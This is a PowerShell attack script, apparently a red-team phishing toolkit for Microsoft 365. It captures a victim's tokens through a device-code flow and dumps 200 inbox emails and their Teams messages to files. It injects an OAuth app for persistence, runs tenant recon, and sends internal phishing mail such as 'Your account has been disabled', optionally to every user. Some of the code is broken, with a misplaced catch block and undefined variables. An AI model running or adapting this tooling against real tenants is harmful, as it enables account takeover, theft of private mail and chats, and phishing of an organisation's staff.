[CmdletBinding()]
param (
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$azureHound,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$recon,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$azureAd,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$persistence,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$GraphRecon,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$targetUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$firstUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$messageContent, 
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$subject,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$ReplyUrl,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$AppName,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$Scope

)

function New-TokensObject {
    param(
        [Parameter(Mandatory=$true)]
        [string]$AccessToken,
        
        [Parameter(Mandatory=$true)]
        [string]$RefreshToken
    )

    $tokens = New-Object PSObject -Property @{
        access_token = $AccessToken
        refresh_token = $RefreshToken
    }

    return $tokens
}


$modules = .\Scripts\Import.ps1

# Check if $Token has been specified and is not null or empty
if ([string]::IsNullOrWhiteSpace($Token)) {
    # If $Token is not specified, just call Get-AzureToken for Graph
    Write-Output "`$Token is not specified. Generating new device code."
    Invoke-ClearToken -Token All
    Write-Output "Clearing any previous tokens for a clean run."
    Get-AzureToken -Client Graph    
} else {
    # If $Token is specified, use it with the CaptureCode parameter
    Write-Output "Using specified access token $Token."
    Get-AzureToken -Client Graph -CaptureCode $Token
}


Write-Output "Victim authentication flow"

$access = $response.access_token
$refresh = $response.refresh_token

Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

# Target details constructed from token   
$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]
Write-Output "$user took the bait."

# Other process listens for creation of this file, validates target with feedback from the token
$switch = "$user"
$switch | Write-Output "$user" > target.txt 

if ($azureAd) {
    try {
        Write-Output "Starting AzureAd module..."
        .\azuread.ps1 -response $response
    }
    catch {
        Write-Error "An error occurred in the AzureAd block: $_"
        # Optionally, you can exit the script here
        # exit 1
    }
}

if ($recon) {
    try {
        Write-Output "Starting Recon module..."
        .\Recon.ps1 -accessToken $access -refreshToken $refresh
    }
    catch {
        Write-Error "An error occurred in the Recon block: $_"
        # Optionally, you can exit the script here
        # exit 1
    }
}

if ($azureHound) {
    try {
        Write-Output "Starting AzureHound module..."
        .\azurehound.ps1 -domain $domain -refreshToken $response.refresh_token
    }
    catch {
        Write-Error "An error occurred in the AzureHound block: $_"
        # Optionally, you can exit the script here
        # exit 1
    }
}

if ($persistence) {
    try {
        Write-Output "Injecting OAuth App for Persistence (Phirst.ps1)"

        Start-Transcript -Path ".\PersistenceApps.log" -Append
        $tokz = Invoke-RefreshToMSGraphToken -domain $domain -refreshToken $refresh -Device iPhone -Browser Safari

        # Assuming $response is an object with access_token and refresh_token
        if ($tokz) {
            $tokens = New-TokensObject -AccessToken $tokz.access_token -RefreshToken $tokz.refresh_token
            # Output the tokens for verification (optional)
            Write-Host "Access Token from tokens object: $($tokens.access_token)"
            Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
        }
        Import-Module .\Modules\GraphRunner.ps1
        Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token
        Invoke-InjectOAuthApp -AppName $AppName -ReplyUrl $ReplyUrl -scope $Scope -Tokens $tokens # *> .\Persistence.json 
        Stop-Transcript

    catch {
            Write-Error "An error occurred in the persistence block: $_"
            # Optionally, you can exit the script here
            # exit 1
        }
    }
}


if ($GraphRecon) {
    try {
        Start-Transcript -Path ".\GraphRecon.log" -Append
        $tokz = Invoke-RefreshToMSGraphToken -domain $domain -refreshToken $refresh -Device iPhone -Browser Safari

        # Assuming $response is an object with access_token and refresh_token
        if ($tokz) {
            $tokens = New-TokensObject -AccessToken $tokz.access_token -RefreshToken $tokz.refresh_token
            # Output the tokens for verification (optional)
            Write-Host "Access Token from tokens object: $($tokens.access_token)"
            Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
        }
        Import-Module .\Modules\GraphRunner.ps1
        Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token
        Invoke-GraphRecon -Tokens $tokens -PermissionEnum
        Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
        Invoke-GraphRunner -Tokens $tokens
        Stop-Transcript
    }
    catch {
        Write-Error "An error occurred in the persistence block: $_"
        # Optionally, you can exit the script here
        # exit 1
    }
}




### Refresh to Graph, Dump emails
Write-Output "Dumping last 200 emails from inbox"
Invoke-RefreshToMSGraphToken -refreshtoken  $response.refresh_token -domain $domain -Device iPhone -Browser Safari
$emails = Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox -Device iPhone -Browser Safari -Top 200
$jsonData = $emails | ConvertTo-Json
$jsonData | Out-File -FilePath "$user.emails.json"

### Get Teams Token and export for AADInternals
$teams=Invoke-RefreshToMSTeamsToken -refreshToken $response.refresh_token -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $teams.access_token -RefreshToken $teams.refresh_token

### Export TeamsMessages
Write-Output "Dumping Teams messages"
$msgs = Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName 

### Convert the chats to JSON
$jsonData = $msgs | ConvertTo-Json
$jsonData | Out-File -FilePath "$user.teams.json"

### Delay between retries (in seconds)
$retryDelay = 5

### Phishing Message Content

$At=Invoke-RefreshToOutlookToken -domain $domain -refreshtoken $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $At.access_token -RefreshToken $At.refresh_token

### Teams Messages - Send over Teams
# $teamsMessage = @{
#     Body = @{
#         ContentType = "html"
#         Content = $messageContent
#     }
# }




### Teams Messages - Function to handle message sending with retry logic
function Send-TeamsMessageWithRetry {
    param(
        [string]$Recipient,
        [hashtable]$teamsMessage
    )

    $retryCount = 0
    $maxRetries = 3
    $retryDelay = 5

    while ($retryCount -lt $maxRetries) {
        try {
            Send-AADIntTeamsMessage -Recipients $Recipient -Message $Message
            Write-Host "Message sent to $Recipient successfully."
            return
        } catch {
            Write-Host "Error sending message to $Recipient. Retrying in $retryDelay seconds..."
            Start-Sleep -Seconds $retryDelay
            $retryCount++
        }
    }

    Write-Host "Failed to send message to $Recipient after $maxRetries attempts."
}



$teamsMessage = $messageContent

### Conditional logic for Sending Messages
if ($targetUser) {
    if ($targetUser -eq "all") {
        foreach ($user in $users) {
            Read-Host "Warning: This will will attempt to send your phishing message to every user in the tenant. Do you want to continue?"
            Write-Output "You like to party."
            Write-Output "Setting status message to 'Gone Phishin' and going wide."
            Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
            
            Write-Output "Sending messages..."
            # Send-TeamsMessageWithRetry -Recipient $user.UserPrincipalName -Message $teamsMessage
        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $user -Subject "Your account has been disabled" -Message $teamsMessage
        }
    } else {
        Write-Output "Setting user status message to 'Gone Phishin'"
        Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
        # Send-TeamsMessageWithRetry -Recipient $targetUser -Message $teamsMessage
        Write-Output "Sending message..."        
        $mailuser = $targetUser

        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $mailUser -Subject $subject -Message $teamsMessage
    }
} else {
    Write-Host "No Teams user specified. Skipping message sending."
}


# # Persistence
# if ($persistence) {
#     try {
#         Write-Output "Starting OAuth Injection module..."
#         .\Modules\Inject-OAuthApp.ps1 -response $response -AppName $AppName -ReplyUrl $ReplyUrl -Scope $Scope 
#     }
#     catch {
#         Write-Error "An error occurred in the AzureHound block: $_"
#         # Optionally, you can exit the script here
#         # exit 1
#     }
# }